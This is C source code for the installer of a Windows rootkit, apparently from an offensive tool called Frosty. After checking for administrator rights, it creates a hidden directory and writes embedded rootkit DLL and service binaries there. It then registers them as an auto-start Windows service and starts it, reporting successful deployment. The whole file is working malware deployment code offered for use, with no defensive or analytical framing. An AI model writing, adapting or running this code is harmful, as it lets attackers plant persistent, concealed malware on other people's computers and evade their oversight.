#include <windows.h>
#include <stdio.h>
#include "../../config.h"
#include "Raw.h"
#pragma warning(disable:4996)

VOID Banner() {
    puts(R"EOF(
      ______                __       
     / ____/________  _____/ /___  __
    / /_  / ___/ __ \/ ___/ __/ / / /
   / __/ / /  / /_/ (__  ) /_/ /_/ / 
  /_/   /_/   \____/____/\__/\__, /  
                            /____/                         
)EOF");
    printf("          [Coded by MrEmpy]\n               [v%s]\n\n", RK_VERSION);
}

VOID ExtractRkFiles() {
    FILE* rkDll_f;
    FILE* rkService_f;

    rkDll_f = _wfopen(RK_DLL_PATH, L"wb");
    fwrite(rkDll, sizeof(rkDll), 1, rkDll_f);
    fclose(rkDll_f);

    rkService_f = _wfopen(RK_SERVICE_PATH, L"wb");
    fwrite(rkService, sizeof(rkService), 1, rkService_f);
    fclose(rkService_f);
}

BOOL HasFilePathW(const wchar_t* path) {
    WIN32_FIND_DATAW fData;
    wchar_t fullPath[MAX_PATH];
    if (FindFirstFileW(path, &fData) != INVALID_HANDLE_VALUE) {
        if (GetFullPathNameW(fData.cFileName, MAX_PATH, fullPath, NULL) == 0) {
            return 1;
        }
        else {
            return 0;
        }
    }
    return 0;
}

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

int main() {
    Banner();
    if (IsElevated() == 0) {
        puts("[-] You need administrative privilege to deploy the rootkit");
        return 1;
    }

    if (HasFilePathW(HIDE_PATH) == 0) {
        wprintf(L"[*] The path \"%ls\" does not exist\n", HIDE_PATH);
        puts("[*] Creating directory");

        if (CreateDirectoryW(HIDE_PATH, NULL) != 0) {
            puts("[+] Directory created successfully");
        }
        else {
            printf("[-] Error creating directory: %lu\n", GetLastError());
            puts("[*] Try creating the path manually and launch the program again");
            return 1;
        }
    }

    ExtractRkFiles();
    puts("[+] Extracted rootkit files");

    SC_HANDLE scm, service;
    scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    if (scm == NULL) {
        printf("[-] Error opening Service Control Manager: %lu\n", GetLastError());
        return 1;
    }

    service = CreateServiceW(
        scm,
        RK_SERVICE_NAME,
        RK_SERVICE_DESCRIPTION,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        RK_SERVICE_PATH,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (service == NULL) {
        printf("[-] Error creating the service: %lu\n", GetLastError());
        CloseServiceHandle(scm);
        return 1;
    }

    if (StartService(service, 0, NULL) == 0) {
        printf("[-] Error starting the service: %lu\n", GetLastError());
        CloseServiceHandle(service);
        CloseServiceHandle(scm);
        return 1;
    }

    printf("[+] Rootkit successfully deployed!\n");

    CloseServiceHandle(service);
    CloseServiceHandle(scm);

    return 0;
}